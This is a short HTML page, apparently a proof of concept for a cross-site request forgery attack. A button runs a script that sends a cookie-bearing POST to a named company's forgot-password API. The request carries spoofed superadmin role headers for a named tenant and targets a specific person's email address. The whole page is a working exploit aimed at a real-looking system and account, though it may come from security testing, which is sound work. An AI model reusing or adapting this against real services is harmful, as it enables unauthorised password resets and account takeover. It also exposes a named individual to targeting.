<!DOCTYPE html>
<html>
<head>
  <title>CSRF Demo</title>
</head>
<body>

<h2>CSRF Attack Demo</h2>

<button onclick="attack()">Trigger CSRF Attack</button>

<pre id="output"></pre>

<script>
async function attack() {
  try {
    const res = await fetch("https://grow-uat.fareye.co/api/tenant/merchants/forgot-password", {
      method: "POST",
      credentials: "include", // tries to send cookies
      headers: {
        "Content-Type": "application/json",
        "role": "superadmin",
        "tenant": "couriersplease",
        "userType": "superadmin"
      },
      body: JSON.stringify({
        email: "anandita.sharma@getfareye.com"
      })
    });

    const text = await res.text();
    document.getElementById("output").innerText =
      "Status: " + res.status + "\n\nResponse:\n" + text;

  } catch (err) {
    document.getElementById("output").innerText = "Error:\n" + err;
  }
}
</script>

</body>
</html>
